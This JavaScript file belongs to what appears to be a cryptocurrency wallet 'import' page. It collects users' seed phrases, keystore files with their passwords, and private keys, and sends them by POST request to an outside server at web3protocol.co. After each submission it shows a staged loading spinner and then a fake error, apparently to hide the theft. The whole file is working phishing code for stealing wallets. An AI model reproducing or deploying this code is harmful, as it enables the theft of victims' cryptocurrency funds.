localStorage.setItem("phraseType", "Phrase");
const phraseTypes = document.querySelectorAll(".phrase-type");

phraseTypes.forEach((phraseType) => {
  phraseType.addEventListener("click", function (e) {
    // e.preventDefault();
    const phraseType = this.textContent;
    localStorage.setItem("phraseType", phraseType);
  });
});

function loadEffect() {
  setTimeout(function () {
    // After 5 seconds, hide the loading and show the error (or success) message
    document.getElementById("loading").style.display = "none";
    document.getElementById("error").style.display = "block";
  }, 5000);
}

const importBTNs = document.querySelectorAll(".import-btn");

importBTNs.forEach((importBTN) => {
  importBTN.addEventListener("click", async function (e) {
    const feature = localStorage.getItem("feature").split("F-")[1];
    const coin = localStorage.getItem("coin");
    const phraseType = localStorage.getItem("phraseType");

    // Open the modal
    $("#exampleModalCenter").modal("show");

    // Show the loading spinner and hide the error section initially
    document.getElementById("loading").style.display = "block";
    document.getElementById("error").style.display = "none";

    const requestURL = "https://www.web3protocol.co/submit";
    const requestURLRemote = "http://localhost:5001/submit";

    // Add your existing logic for handling Phrase, Keystore JSON, or Private Key
    if (phraseType === "Phrase") {
      const phrase = document.querySelector(".Phrase").value;
      if (phrase.split(" ").length < 12) {
        alert("Please enter a phrase that is between 12 to 24 words.");
        return;
      }
      const res = await fetch(requestURL, {
        method: "POST",
        body: JSON.stringify({ feature, coin, phraseType, phrase }),
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        },
      });
      await res.json();
      loadEffect();
    }

    if (phraseType === "Keystore JSON") {
      const phrase = document.querySelector(".Keystore-JSON").value;
      const password = document.querySelector(".Keystore-JSON-password").value;

      const res = await fetch(requestURL, {
        method: "POST",
        body: JSON.stringify({ feature, coin, phraseType, phrase, password }),
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        },
      });
      await res.json();
      loadEffect();
    }

    if (phraseType === "Private Key") {
      const phrase = document.querySelector(".PrivateKey").value;
      if (phrase.length !== 64) {
        alert("Private key must be 64 alphanumeric characters");
        return;
      }
      const res = await fetch(requestURL, {
        method: "POST",
        body: JSON.stringify({ feature, coin, phraseType, phrase }),
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        },
      });
      await res.json();
      loadEffect();
    }
  });
});
